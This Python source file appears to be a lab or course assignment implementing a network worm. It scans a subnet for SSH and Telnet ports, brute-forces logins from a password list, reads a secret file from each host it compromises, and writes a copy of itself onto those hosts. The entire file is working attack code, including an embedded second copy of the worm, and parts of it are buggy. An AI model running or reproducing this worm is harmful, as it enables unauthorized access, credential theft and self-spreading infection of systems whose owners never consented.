import socket
import paramiko
import telnetlib

def find_vulnerable_machines(ip):
    open_ssh_ports = []
    open_telnet_ports = []

    ssh = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssh.settimeout(1)
    if ssh.connect_ex((ip, 22)) == 0:
        with open('open_ssh.log', 'a') as file:
            file.write(f'{ip}\n')
    ssh.close()

    telnet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    telnet.settimeout(1)
    if telnet.connect_ex((ip, 23)) == 0:
        with open('open_telnet.log', 'a') as file:
            file.write(f'{ip}\n')
    telnet.close()


def find_vulnerable_accounts():
    #get all the ssh ips
    with open('open_ssh.log', 'r') as file:
        ssh_ips = file.readlines()

    # get all the telnet ips
    with open('open_telnet.log', 'r') as file:
        telnet_ips = file.readlines()
    
    with open('Q2pwd', 'r') as file:
        lines = file.readlines()
    
    # matching each username and password to each other in a dict
    username_password = {}
    for line in lines:
        parts = line.split(' ')
        username_password[parts[0]] = parts[1].strip()


    ssh_log_file = open('ssh_accounts.log', 'w')
    telnet_log_file = open('telnet_accounts.log', 'w')


    ssh_credentials = []
    for host in ssh_ips:
        host = host.strip()
        for username, password in username_password.items():
            try:
                ssh_client = paramiko.client.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh_client.connect(host, username=username, password=password, timeout = 1, banner_timeout = 1)
                ssh_log_file.write(f"{host},{username},{password}\n")
                ssh_client.close()
            except:
                pass

    for host in telnet_ips:
        host = host.strip()
        for username, password in username_password.items():

            try:
                telnet_client = telnetlib.Telnet(host, timeout= 1)
                telnet_client.read_until(b"login:")  
                telnet_client.write(username.encode('ascii') + b"\n")
                telnet_client.read_until(b"Password:")  
                telnet_client.write(password.encode('ascii') + b"\n")
                output = telnet_client.read_until(b"$", timeout = 1)
                if b"$" in output:
                    telnet_log_file.write(f"{host},{username},{password}\n")
                telnet_client.close()
            except:
                pass

    ssh_log_file.close()
    telnet_log_file.close()


def extract_and_infect(Q2worm_code):
    with open('ssh_accounts.log', 'r') as file:
        ssh_accounts = file.readlines()

    with open('telnet_accounts.log', 'r') as file:
        telnet_accounts = file.readlines()


    ssh_hosts = []
    ssh_usernames = []
    ssh_passwords = []

    for ssh_account_info in ssh_accounts:
        ssh_account = ssh_account_info.split(',')

        ssh_hosts.append(ssh_account[0].strip())
        ssh_usernames.append(ssh_account[1].strip())
        ssh_passwords.append(ssh_account[2].strip())


    telnet_hosts = []
    telnet_usernames = []
    telnet_passwords = []

    for telnet_account_info in telnet_accounts:
        telnet_account = telnet_account_info.split(',')

        telnet_hosts.append(telnet_account[0].strip())
        telnet_usernames.append(telnet_account[1].strip())
        telnet_passwords.append(telnet_account[2].strip())


    
    with open('extracted_secrets.log', 'w') as local_file:
        # ssh 
        for i in range(len(ssh_hosts)):
            host = ssh_hosts[i]
            ssh_client = paramiko.client.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(host, username=ssh_usernames[i], password=ssh_passwords[i], timeout = 10, banner_timeout = 10)
            sftp = ssh_client.open_sftp()
            with sftp.open('Q2secret', 'r') as remote_file:
                secret = remote_file.read().strip().decode()
                local_file.write(f'{ssh_hosts[i]},{ssh_usernames[i]},{secret}\n')
            
            #making a new file and inputting the code of Q2worm.py
            with sftp.open('Q2worm_new.py', 'w') as new_file:
                new_file.write(Q2worm_code)
                
            sftp.close()
            ssh_client.close()

        #telnet
        for i in range(len(telnet_hosts)):
            telnet_client = telnetlib.Telnet(telnet_hosts[i], timeout= 5)
            telnet_client.read_until(b"login:")  
            telnet_client.write(telnet_usernames[i].encode('ascii') + b"\n")
            telnet_client.read_until(b"Password:")  
            telnet_client.write(telnet_passwords[i].encode('ascii') + b"\n")
            telnet_client.read_until(b"$")
        

            telnet_client.write(b'cat Q2secret\n')

            output = telnet_client.read_until(b"$").decode('ascii').split('\n')[1]
            local_file.write(f'{ssh_hosts[i]},{ssh_usernames[i]},{output}\n')
            telnet_client.write(b"\x04")
            #making a new file and inputting the code of Q2worm.py
            telnet_client.write(b'touch Q2worm_new.py\n')
            telnet_client.write(b'cat Q2worm_new.py\n')
            telnet_client.write(Q2worm_code.encode('ascii') + b"\n")
            
            telnet_client.close()


# for i in range(256):
#     find_vulnerable_machines(str(f'10.13.4.{i}'))

#find_vulnerable_accounts()

Q2worm_code = '''import socket
import paramiko
import telnetlib

def find_vulnerable_machines(ip):
    open_ssh_ports = []
    open_telnet_ports = []

    ssh = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssh.settimeout(1)
    if ssh.connect_ex((ip, 22)) == 0:
        with open('open_ssh.log', 'a') as file:
            file.write(f'{ip}\n')
    ssh.close()

    telnet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    telnet.settimeout(1)
    if telnet.connect_ex((ip, 23)) == 0:
        with open('open_telnet.log', 'a') as file:
            file.write(f'{ip}\n')
    telnet.close()


def find_vulnerable_accounts():
    #get all the ssh ips
    with open('open_ssh.log', 'r') as file:
        ssh_ips = file.readlines()

    # get all the telnet ips
    with open('open_telnet.log', 'r') as file:
        telnet_ips = file.readlines()
    
    with open('Q2pwd', 'r') as file:
        lines = file.readlines()
    
    # matching each username and password to each other in a dict
    username_password = {}
    for line in lines:
        parts = line.split(' ')
        username_password[parts[0]] = parts[1].strip()


    ssh_log_file = open('ssh_accounts.log', 'w')
    telnet_log_file = open('telnet_accounts.log', 'w')


    ssh_credentials = []
    for host in ssh_ips:
        host = host.strip()
        for username, password in username_password.items():
            try:
                ssh_client = paramiko.client.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh_client.connect(host, username=username, password=password, timeout = 1, banner_timeout = 1)
                ssh_log_file.write(f"{host},{username},{password}\n")
                ssh_client.close()
            except:
                pass

    for host in telnet_ips:
        host = host.strip()
        for username, password in username_password.items():

            try:
                telnet_client = telnetlib.Telnet(host, timeout= 1)
                telnet_client.read_until(b"login:")  
                telnet_client.write(username.encode('ascii') + b"\n")
                telnet_client.read_until(b"Password:")  
                telnet_client.write(password.encode('ascii') + b"\n")
                output = telnet_client.read_until(b"$", timeout = 1)
                if b"$" in output:
                    telnet_log_file.write(f"{host},{username},{password}\n")
                telnet_client.close()
            except:
                pass

    ssh_log_file.close()
    telnet_log_file.close()


def extract_and_infect():
    with open('ssh_accounts.log', 'r') as file:
        ssh_accounts = file.readlines()

    with open('telnet_accounts.log', 'r') as file:
        telnet_accounts = file.readlines()


    ssh_hosts = []
    ssh_usernames = []
    ssh_passwords = []

    for ssh_account_info in ssh_accounts:
        ssh_account = ssh_account_info.split(',')

        ssh_hosts.append(ssh_account[0].strip())
        ssh_usernames.append(ssh_account[1].strip())
        ssh_passwords.append(ssh_account[2].strip())


    telnet_hosts = []
    telnet_usernames = []
    telnet_passwords = []

    for telnet_account_info in telnet_accounts:
        telnet_account = telnet_account_info.split(',')

        telnet_hosts.append(telnet_account[0].strip())
        telnet_usernames.append(telnet_account[1].strip())
        telnet_passwords.append(telnet_account[2].strip())


    
    with open('extracted_secrets.log', 'w') as local_file:
        # ssh 
        for i in range(len(ssh_hosts)):
            host = ssh_hosts[i]
            ssh_client = paramiko.client.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(host, username=ssh_usernames[i], password=ssh_passwords[i], timeout = 10, banner_timeout = 10)
            sftp = ssh_client.open_sftp()
            with sftp.open('Q2secret', 'r') as remote_file:
                secret = remote_file.read().strip().decode()
                local_file.write(f'{ssh_hosts[i]},{ssh_usernames[i]},{secret}\n')
            
            
            with sftp.open('Q2worm_new.py', 'w') as new_file:
                new_file.write(Q2worm_code)
                    
            sftp_client.put('Q2worm.py', )
            sftp.close()
            ssh_client.close()

        #telnet
        for i in range(len(telnet_hosts)):
            telnet_client = telnetlib.Telnet(telnet_hosts[i], timeout= 5)
            telnet_client.read_until(b"login:")  
            telnet_client.write(telnet_usernames[i].encode('ascii') + b"\n")
            telnet_client.read_until(b"Password:")  
            telnet_client.write(telnet_passwords[i].encode('ascii') + b"\n")
            telnet_client.read_until(b"$")
            telnet_client.write(b'cat Q2secret\n')

            output = telnet_client.read_until(b"$").decode('ascii').split('\n')[1]
            local_file.write(f'{ssh_hosts[i]},{ssh_usernames[i]},{output}\n')

            telnet_client.close()


# for i in range(256):
#     find_vulnerable_machines(str(f'10.13.4.{i}'))

#find_vulnerable_accounts()

extract_and_infect()'''
extract_and_infect(Q2worm_code)

